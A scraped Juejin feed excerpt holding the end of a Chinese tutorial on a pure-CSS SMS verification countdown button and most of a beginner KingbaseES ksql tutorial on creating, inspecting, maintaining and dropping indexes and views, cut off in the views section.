.hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>点击发送短信验证码倒数60秒后可重新发送，借助 <code>if()</code> 纯 CSS 也能实现这样的效果。</p>
<blockquote>
<p>要求 Chrome/Edge ≥ 137</p>
</blockquote>
<p><span href="https://code.juejin.cn/pen/7602229993149562916" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7602229993149562916" data-src="https://code.juejin.cn/pen/7602229993149562916" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<ul>
<li>
<p><code>@property</code> 是 CSS Houdini API 的一部分，用来定义 CSS 自定义属性。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@property</span> --num {
  syntax: <span class="hljs-string">"&lt;integer&gt;"</span>;
  initial-value: <span class="hljs-number">0</span>;
  inherits: true;
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>if()</code> 允许根据条件测试的结果为属性设置不同的值。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span> {
  <span class="hljs-attr">--num</span>: <span class="hljs-built_in">var</span>(--sec);
  counter-set: count <span class="hljs-built_in">var</span>(--num);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): blue; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): blue; else: <span class="hljs-number">#999</span>; );
  <span class="hljs-attribute">pointer-events</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): initial; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): initial; else: none; );
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>counter()</code> 返回一个代表计数器的当前值的字符串。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>)<span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-number">0</span>): <span class="hljs-string">"重新发送"</span>; else: <span class="hljs-built_in">counter</span>(count) <span class="hljs-string">"秒后可重新发送"</span>; );
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>steps()</code> 定义了一个过渡效果，将输入时间划分为指定数量的等长间隔。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>) {
  <span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transition</span>: --num <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--sec) * <span class="hljs-number">1s</span>) <span class="hljs-built_in">steps</span>(<span class="hljs-built_in">var</span>(--sec), jump-start);
}
</code></pre>
</li>
</ul>
<p>完整代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>纯CSS实现发送验证码读秒倒数 - if函数妙用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-keyword">@property</span> --num {
      syntax: <span class="hljs-string">"&lt;integer&gt;"</span>;
      initial-value: <span class="hljs-number">0</span>;
      inherits: true;
    }
    <span class="hljs-selector-pseudo">:root</span> {
      <span class="hljs-attr">--sec</span>: <span class="hljs-number">11</span>;
    }
    <span class="hljs-selector-tag">label</span> {
      <span class="hljs-attr">--num</span>: <span class="hljs-built_in">var</span>(--sec);
      counter-set: count <span class="hljs-built_in">var</span>(--num);
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): blue; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): blue; else: <span class="hljs-number">#999</span>; );
      <span class="hljs-attribute">pointer-events</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): initial; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): initial; else: none; );
      <span class="hljs-attribute">cursor</span>: pointer;
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">::after</span> {
      <span class="hljs-attr">--num</span>: inherit;
      <span class="hljs-attribute">content</span>: <span class="hljs-string">"发送验证码"</span>;
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>)<span class="hljs-selector-pseudo">::after</span> {
      <span class="hljs-attribute">content</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-number">0</span>): <span class="hljs-string">"重新发送"</span>; else: <span class="hljs-built_in">counter</span>(count) <span class="hljs-string">"秒后可重新发送"</span>; );
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>) {
      <span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">transition</span>: --num <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--sec) * <span class="hljs-number">1s</span>) <span class="hljs-built_in">steps</span>(<span class="hljs-built_in">var</span>(--sec), jump-start);
    }
    <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">input</span> {
      <span class="hljs-attribute">display</span>: none;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"send-code"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"send-code"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑]]></title>    <link>https://juejin.cn/post/7601464318409457706</link>    <guid>https://juejin.cn/post/7601464318409457706</guid>    <pubDate>2026-02-02T01:40:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601464318409457706" data-draft-id="7601387539335479332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-02-02T01:40:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xcLeigh"/> <meta itemprop="url" content="https://juejin.cn/user/1775071503323875"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1775071503323875/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xcLeigh
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-02T01:40:20.000Z" title="Mon Feb 02 2026 01:40:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑</h2>
<blockquote>
<p>本文聚焦 KingbaseES 数据库中 ksql 命令行对索引与视图的操作，先介绍前置准备，需连接数据库切换至目标模式（如 test_schema），确认并创建 sys_user 表，插入测试数据。接着详解索引管理，涵盖普通、唯一、复合三类索引的创建方法，用 \di、\d + 命令查看索引，通过重建、重命名、删除进行维护，还给出索引数量不超 5 个、小表无需建索引等避坑提示。然后阐述视图管理，包括基础、进阶、只读视图的创建，用 \dv、\d + 命令查看，以及查询、修改、删除操作，强调视图修改限制等注意事项。最后排查高频报错，总结索引与视图配合使用要点，助力新手掌握高效查询技能。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cb22951c3d74268b450eff84b73f6cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGNMZWlnaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770601220&amp;x-signature=Y%2FoZtfC%2FvZ5IuymebfSoq1VJh5Y%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d34bcdae126460cbf4f2d54b7c90145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGNMZWlnaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770601220&amp;x-signature=%2Bo%2BhMrn0xwsmcYKwBOHelbsXiWA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>学会了表的基本操作后，要是想让查询更快、访问数据更省事，那“索引”和“视图”这俩好帮手可得好好学一学。说起来，索引就像咱们看书时的目录，翻找内容能省不少劲；视图呢，更像是个专属数据窗口，不仅能把复杂的查询逻辑藏起来，还能控制哪些数据能被看到。今天咱就专门聊聊“ksql命令行操作索引与视图”，从它们的作用、创建方法，到怎么查看、维护，最后怎么删除，一步步拆成实实在在的操作步骤，再配上例子和避坑小提示，保证新手朋友也能看懂、能用起来。</p>
<h3 data-id="heading-1">一、前置准备：确认操作基础（衔接前文，确保连贯）</h3>
<p>索引和视图都得依托已有的表才能用，所以咱得先做好下面这些准备工作（大家可以参考第四篇“表的运作”的相关内容），别到时候操作半天，因为少了基础依赖弹出一堆错误提示，那就麻烦了。</p>
<h4 data-id="heading-2">1.1 连接数据库并切换目标模式</h4>
<p>先用ksql连上本地的KingbaseES数据库，再切换到之前创建的<code>test_schema</code>模式里。接着得确认一下目标表在不在，就拿<code>sys_user</code>表举例，要是没有，要么重新建一个，要么换个新例子表，总之得保证后面的操作能顺利进行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 连接数据库（若未连接）</span>
ksql <span class="hljs-operator">-</span>d kingbase <span class="hljs-operator">-</span>U <span class="hljs-keyword">system</span>
<span class="hljs-comment">-- 2. 切换到 test_schema 模式</span>
<span class="hljs-keyword">SET</span> search_path <span class="hljs-keyword">TO</span> test_schema, public;
<span class="hljs-comment">-- 3. 确认目标表存在（如 sys_user 表）</span>
\dt sys_user;
<span class="hljs-comment">-- 若不存在，创建示例表（用于后续索引/视图操作）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> sys_user (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    phone <span class="hljs-type">CHAR</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    create_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
) TABLESPACE test_ts;
</code></pre>
<p>执行完要是显示<code>Table "test_schema.sys_user" does not exist</code>，那就先执行上面的<code>CREATE TABLE</code>语句建表，有了表，后面的操作才有载体。</p>
<h4 data-id="heading-3">1.2 插入测试数据（用于验证索引/视图效果）</h4>
<p>为了后面能测试索引的查询速度，也能看看视图展示数据的样子，得给<code>sys_user</code>表加些模拟数据。最好多加点，比如上千条，这样更贴近真实使用场景。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 批量插入10条测试数据（可复制扩展）</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> test_schema.sys_user (name, phone, email)
<span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'张三'</span>, <span class="hljs-string">'13800138000'</span>, <span class="hljs-string">'zhangsan@test.com'</span>),
(<span class="hljs-string">'李四'</span>, <span class="hljs-string">'13900139000'</span>, <span class="hljs-string">'lisi@test.com'</span>),
(<span class="hljs-string">'王五'</span>, <span class="hljs-string">'13700137000'</span>, <span class="hljs-string">'wangwu@test.com'</span>),
(<span class="hljs-string">'赵六'</span>, <span class="hljs-string">'13600136000'</span>, <span class="hljs-string">'zhaoliu@test.com'</span>),
(<span class="hljs-string">'孙七'</span>, <span class="hljs-string">'13500135000'</span>, <span class="hljs-string">'sunqi@test.com'</span>),
(<span class="hljs-string">'周八'</span>, <span class="hljs-string">'13400134000'</span>, <span class="hljs-string">'zhouba@test.com'</span>),
(<span class="hljs-string">'吴九'</span>, <span class="hljs-string">'13300133000'</span>, <span class="hljs-string">'wujiu@test.com'</span>),
(<span class="hljs-string">'郑十'</span>, <span class="hljs-string">'13200132000'</span>, <span class="hljs-string">'zhengshi@test.com'</span>),
(<span class="hljs-string">'钱一'</span>, <span class="hljs-string">'13100131000'</span>, <span class="hljs-string">'qianyi@test.com'</span>),
(<span class="hljs-string">'冯二'</span>, <span class="hljs-string">'1300130000'</span>, <span class="hljs-string">'fenger@test.com'</span>);
</code></pre>
<p>执行后要是提示<code>INSERT 0 10</code>，那就说明数据插成功了，后面的测试就有了基础。</p>
<h3 data-id="heading-4">二、索引管理：给表“加目录”，加速查询</h3>
<p>在KingbaseES里，想让查询变快，索引可是核心手段。你想啊，要是表的数据量大，比如有10万条以上，没索引的话，查询就得“全表扫描”，一条一条找，多慢啊；但有了索引就不一样了，相当于有了“目录”，直接定位到数据，速度能快成百上千倍。接下来咱就按“创建→查看→维护→删除”的顺序好好说说。</p>
<h4 data-id="heading-5">2.1 先懂基础：索引的类型与适用场景</h4>
<p>新手朋友得先搞明白不同索引有啥用，可别瞎创建。要知道，索引不是越多越好，多了反而会增加数据更新、插入的开销。</p>
<h4 data-id="heading-6">2.2 创建索引：用CREATE INDEX语句</h4>
<h5 data-id="heading-7">2.2.1 示例1：创建普通索引（加速单字段查询）</h5>
<p>要是经常按手机号查用户，那给<code>sys_user</code>表的<code>phone</code>列建个普通索引就很合适。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE INDEX 索引名 ON 表名(字段名);</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_sys_user_phone <span class="hljs-keyword">ON</span> test_schema.sys_user(phone);
</code></pre>
<ul>
<li><strong>索引名规范</strong>：建议用“idx_表名_字段名”这种格式，比如“idx_sys_user_phone”，一看就知道是“sys_user”表里“phone”列的索引，多好认。</li>
<li><strong>成功验证</strong>：执行后提示<code>CREATE INDEX</code>，那就说明索引建好了。</li>
</ul>
<h5 data-id="heading-8">2.2.2 示例2：创建唯一索引（确保字段唯一+加速查询）</h5>
<p>给<code>sys_user</code>表的<code>email</code>列建个唯一索引也不错，既能保证邮箱不重复，查邮箱的时候也能更快。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE UNIQUE INDEX 索引名 ON 表名(字段名);</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX idx_sys_user_email <span class="hljs-keyword">ON</span> test_schema.sys_user(email);
</code></pre>
<ul>
<li><strong>与UNIQUE约束的区别</strong>：这里得提醒一句，唯一索引只是保证值不重复，而UNIQUE约束里既包含了约束，也自带了唯一索引。所以要是表已经有<code>email</code>的UNIQUE约束，就不用再特意给<code>email</code>建唯一索引了，约束本身就会生成索引。</li>
</ul>
<h5 data-id="heading-9">2.2.3 示例3：创建复合索引（加速多字段组合查询）</h5>
<p>要是经常按“姓名+创建时间范围”查数据，那给<code>sys_user</code>表的<code>name</code>和<code>create_time</code>列建个复合索引就很实用。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE INDEX 索引名 ON 表名(字段1, 字段2);</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_sys_user_name_createtime <span class="hljs-keyword">ON</span> test_schema.sys_user(name, create_time);
</code></pre>
<ul>
<li><strong>字段顺序注意</strong>：复合索引有个“最左符合原则”，比如这个索引(name, create_time)，能加快name单字段的查询，也能加快name+create_time组合的查询，但没法加快create_time单字段的查询。所以字段顺序得根据平时的查询习惯来定，可别搞反了。</li>
</ul>
<h4 data-id="heading-10">2.3 查看索引：确认索引存在与关联表</h4>
<p>建完索引，得用ksql命令看看索引列表、关联的表还有详细信息，推荐大家用<code>\di</code>和<code>\dt+</code>这两个命令，很好用。</p>
<h5 data-id="heading-11">2.3.1 示例1：查看所有索引（\di命令）</h5>
<p>执行<code>\di</code>就能列出当前模式下的所有索引，能快速确认索引是不是建成功了。</p>
<pre><code class="hljs language-sql" lang="sql">\di
</code></pre>
<p><strong>执行结果示例关键信息解读</strong>：</p>
<ul>
<li><code>Table</code>：能看到索引关联的表，确认是不是<code>sys_user</code>表；</li>
<li><code>Columns</code>：能知道索引对应的字段，是单字段还是多字段；</li>
<li><code>sys_user_pkey</code>：这个是主键自动创建的索引，不用咱们手动建。</li>
</ul>
<h5 data-id="heading-12">2.3.2 示例2：查看表关联的索引（\dt+表名）</h5>
<p>要是想查看某张表的所有索引，比如<code>sys_user</code>表，执行<code>\d+ 表名</code>就行。</p>
<pre><code class="hljs language-sql" lang="sql">\d<span class="hljs-operator">+</span> test_schema.sys_user
</code></pre>
<p><strong>执行结果示例（索引部分）</strong>：
这样能直接看到表关联的所有索引，包括索引类型（是PRIMARY KEY、UNIQUE还是普通索引）和对应的字段，清晰又直观，一眼就能看明白。</p>
<h4 data-id="heading-13">2.4 索引维护：优化性能与调整结构</h4>
<p>索引用久了，因为数据经常被删除、更新，可能会出现“碎片化”的情况，就是索引文件里有不少空白空间，这时候就得重建索引来改善。另外，要是想给索引重命名，或者删掉没用的索引，也有对应的方法。</p>
<h5 data-id="heading-14">2.4.1 示例1：重建索引（解决碎片化，提升查询速度）</h5>
<p>要是感觉索引查询变慢了，重建索引就能整理碎片，让性能恢复。不过要注意，要是表很大，最好离线执行，别影响正常业务。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：REINDEX INDEX 索引名;</span>
REINDEX INDEX idx_sys_user_phone;
<span class="hljs-comment">-- 进阶：重建表的所有索引（更高效）</span>
REINDEX <span class="hljs-keyword">TABLE</span> sys_user;
</code></pre>
<ul>
<li><strong>成功验证</strong>：执行后提示<code>REINDEX</code>，就说明重建完成了。</li>
</ul>
<h5 data-id="heading-15">2.4.2 示例2：重命名索引（规范命名）</h5>
<p>要是索引名不符合规范，比如想把<code>idx_sys_user_phone</code>改成<code>idx_sys_user_mobile</code>，直接重命名就行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：ALTER INDEX 旧索引名 RENAME TO 新索引名;</span>
<span class="hljs-keyword">ALTER</span> INDEX idx_sys_user_phone RENAME <span class="hljs-keyword">TO</span> idx_sys_user_mobile;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\d+ test_schema.sys_user</code>，就能看到索引名已经更新了。</li>
</ul>
<h5 data-id="heading-16">2.4.3 示例3：删除索引（无用索引清理）</h5>
<p>要是某个字段查询频率变低了，或者因为索引导致数据插入、更新变慢，那就得把没用的索引删掉。不过要注意，主键索引和跟唯一约束相关的索引不能直接删，得先把约束删掉才行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：DROP INDEX IF EXISTS 索引名;</span>
<span class="hljs-keyword">DROP</span> INDEX IF <span class="hljs-keyword">EXISTS</span> idx_sys_user_name_createtime;
</code></pre>
<ul>
<li><code>IF EXISTS</code>：加这个是为了避免索引不存在的时候报错，只会提示个警告，很贴心；</li>
<li><strong>验证</strong>：执行<code>\d+ test_schema.sys_user</code>，确认索引已经删掉了就行。</li>
</ul>
<h4 data-id="heading-17">2.5 索引使用注意事项（新手避坑指南）</h4>
<ol>
<li>千万别觉得索引越多越好，索引多了，数据插入、更新、删除的时候开销都会变大。毕竟数据一变，索引也得跟着同步更新，多费事儿啊。所以一张表的索引最好别超过5个。</li>
<li>小表就别建索引了，要是数据量不到1万条，全表扫描比用索引查还快。你想啊，用索引还得先找索引再找数据，多了一次IO操作，反而慢了。</li>
<li>经常更新的列别建索引，比如“订单状态”这种字段，每秒都可能变，给它建了索引，索引就得频繁同步更新，多影响整体性能啊。</li>
<li>别对索引字段用函数，比如<code>WHERE SUBSTR(phone,1,3) = '138'</code>这种写法，会让索引失效。改成<code>WHERE phone LIKE '138%'</code>就好，前缀匹配是能用到索引的。</li>
</ol>
<h3 data-id="heading-18">三、视图管理：给数据“开窗口”，简化查询与控制权限</h3>
<p>视图其实是“虚拟表”，它是根据SQL查询结果生成的，本身不存实际数据，数据还在原始表里。但它的用处可不小，能“隐藏复杂查询逻辑”，还能“控制数据可见范围”，比如只让用户看到某些列。下面咱就按“创建-查看-操作-删除”的顺序来讲。</p>
<h4 data-id="heading-19">3.1 先懂基础：视图的核心作用（新手必知）</h4>
<p>新手朋友容易把“表”和“视图”搞混，我给大家打个通俗的比方：</p>
<ul>
<li>表就像“仓库”，里面实实在在存着数据；</li>
<li>视图呢，就是“仓库窗口”，通过这个窗口只能看到指定区域的货物（数据），整个仓库的情况是看不到的。而且这个窗口不能直接改，想改仓库里的数据得通过窗口，但还有不少限制。</li>
</ul>
<p>视图的核心使用场景有这几个：</p>
<ol>
